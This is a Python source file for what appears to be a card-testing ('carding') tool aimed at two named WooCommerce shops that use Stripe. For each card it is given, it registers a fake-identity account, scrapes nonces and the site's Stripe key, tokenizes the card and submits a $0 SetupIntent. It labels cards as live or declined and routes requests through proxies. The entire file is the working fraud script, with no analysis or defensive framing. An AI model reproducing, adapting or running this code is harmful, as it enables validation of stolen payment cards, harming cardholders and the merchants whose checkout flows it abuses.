"""
AU Gate Engine - WooCommerce Stripe SetupIntent Auth ($0.00)
Targets: shop.mydario.com, dilaboards.com
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import aiohttp
import time
import json
import random
import re
import uuid

SITES = [
    "https://shop.mydario.com",
    "https://dilaboards.com"
]

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _parse_between(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

async def _attempt_au_site(session, site_url, cc, mm, yy, cvc, proxy_url=None):
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    try:
        from faker_gen import generate_fake_identity
        ident = generate_fake_identity("US")
        first = ident["firstName"]
        last = ident["lastName"]
        email = ident["email"]
    except Exception:
        first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        first = random.choice(first_names)
        last = random.choice(last_names)
        email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com"

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    host = site_url.replace("https://", "").replace("http://", "").split("/")[0]

    headers_base = {
        'authority': host,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': user_agent,
    }

    # 1. Fetch Register Nonce from My Account
    async with session.get(f'{site_url}/my-account/', headers=headers_base, proxy=proxy_url) as r1:
        html1 = await r1.text()

    nonce_reg = _parse_between(html1, 'name="woocommerce-register-nonce" value="', '"') or \
                _parse_between(html1, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')

    if nonce_reg:
        data_reg = {
            'email': email,
            'woocommerce-register-nonce': nonce_reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        headers_reg = {
            **headers_base,
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url,
            'referer': f'{site_url}/my-account/',
        }
        try:
            async with session.post(f'{site_url}/my-account/', headers=headers_reg, data=data_reg, proxy=proxy_url) as r2:
                await r2.text()
        except Exception:
            pass

    # 2. Get add-payment-method page
    headers_pm = {
        **headers_base,
        'referer': f'{site_url}/my-account/payment-methods/',
    }
    async with session.get(f'{site_url}/my-account/add-payment-method/', headers=headers_pm, proxy=proxy_url) as r3:
        html3 = await r3.text()

    add_card_nonce = _parse_between(html3, '"add_card_nonce":"', '"') or \
                     _parse_between(html3, 'name="woocommerce-add-payment-method-nonce" value="', '"') or \
                     _parse_between(html3, '"createAndConfirmSetupIntentNonce":"', '"')
    if not add_card_nonce:
        m = re.search(r'woocommerce_tokenization_form_params = {.*?"nonce":"([^"]+)"', html3, re.DOTALL)
        add_card_nonce = m.group(1) if m else None

    pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html3)
    stripe_pk = pk_match.group(0) if pk_match else 'pk_live_7IDldKRUXqo2d7gSwMA022p000G1tW0T8A'

    # 3. Tokenize card on Stripe API
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user_agent,
    }
    stripe_data = {
        'type': 'card',
        'billing_details[name]': f"{first} {last}",
        'billing_details[email]': email,
        'billing_details[address][country]': 'US',
        'card[number]': cc,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'allow_redisplay': 'unspecified',
        'payment_user_agent': 'stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent',
        'referrer': site_url,
        'time_on_page': str(random.randint(100000, 999999)),
        'guid': str(uuid.uuid4()),
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
        'key': stripe_pk,
        '_stripe_version': '2024-06-20'
    }

    async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url) as r_stripe:
        stripe_resp = await r_stripe.json()

    idpm = stripe_resp.get("id")
    if not idpm:
        err_msg = (stripe_resp.get("error") or {}).get("message", "Stripe PaymentMethod tokenization failed")
        return False, "DECLINED 🔴", err_msg, json.dumps(stripe_resp)

    # 4. Create Setup Intent on WooCommerce Endpoint
    setup_headers = {
        'authority': host,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
        'origin': site_url,
        'referer': f'{site_url}/my-account/add-payment-method/',
    }
    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': idpm,
        'wc-stripe-payment-type': 'card',
        'stripe_source_id': idpm,
        '_ajax_nonce': add_card_nonce or '',
        'nonce': add_card_nonce or ''
    }

    endpoints = [
        f'{site_url}/?wc-ajax=wc_stripe_create_setup_intent',
        f'{site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent'
    ]

    setup_text = ""
    for ep in endpoints:
        try:
            async with session.post(ep, headers=setup_headers, data=setup_data, proxy=proxy_url) as r_setup:
                txt = await r_setup.text()
                if txt and len(txt) > 5:
                    setup_text = txt
                    break
        except Exception:
            continue

    if not setup_text:
        return False, "DECLINED 🔴", "Empty response from site gateway", ""

    try:
        setup_json = json.loads(setup_text)
    except Exception:
        setup_json = {}

    if "Your card's security code is incorrect" in setup_text or "incorrect_cvc" in setup_text:
        return True, "Approved! CNN 🟩", "Your card's security code is incorrect (CCN Live)", setup_text
    elif "insufficient_funds" in setup_text or "Insufficient funds" in setup_text:
        return True, "Approved! 🟩", "Insufficient funds (Card Live)", setup_text
    elif "success" in setup_text and setup_json.get("success") is True:
        return True, "Approved! 🟩", "SetupIntent Succeeded / Card Added", setup_text
    elif "card_error_authentication_required" in setup_text or "three_d_secure_redirect" in setup_text:
        return False, "DECLINED 🔴", "3D Secure Challenge Required", setup_text
    elif "do_not_honor" in setup_text:
        return False, "DECLINED 🔴", "Do Not Honor (Declined by Issuer)", setup_text
    elif "generic_decline" in setup_text:
        return False, "DECLINED 🔴", "Generic Decline", setup_text
    elif "transaction_not_allowed" in setup_text or "Your card does not support this type of purchase" in setup_text:
        return False, "DECLINED 🔴", "Transaction Not Allowed", setup_text
    else:
        msg = setup_json.get("data", {}).get("message") or setup_json.get("message") or _parse_between(setup_text, '"message":"', '"')
        return False, "DECLINED 🔴", msg if msg else "Payment Method Declined", setup_text

async def check_card_au(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    formatted_proxy = _format_proxy(proxy_url)
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    sites_to_try = SITES.copy()
    random.shuffle(sites_to_try)

    last_err = "All auth targets failed"
    
    # Try with proxy first if available, then fallback to direct connection
    proxy_attempts = [formatted_proxy, None] if formatted_proxy else [None]

    for p_attempt in proxy_attempts:
        for site in sites_to_try:
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    is_live, status, msg, raw = await _attempt_au_site(session, site, cc, mm, yy, cvc, proxy_url=p_attempt)
                    if "Connection reset" not in msg and "Errno 104" not in msg and "site_error" not in msg:
                        return is_live, status, msg, raw
                    last_err = msg
            except Exception as e:
                err_str = str(e)
                if "104" in err_str or "reset" in err_str.lower() or "connect" in err_str.lower():
                    last_err = f"Connection reset on {site} (Retrying without proxy...)" if p_attempt else f"Network reset on {site}"
                    continue
                last_err = err_str

    return False, "DECLINED 🔴", last_err if last_err else "Connection Failed", ""
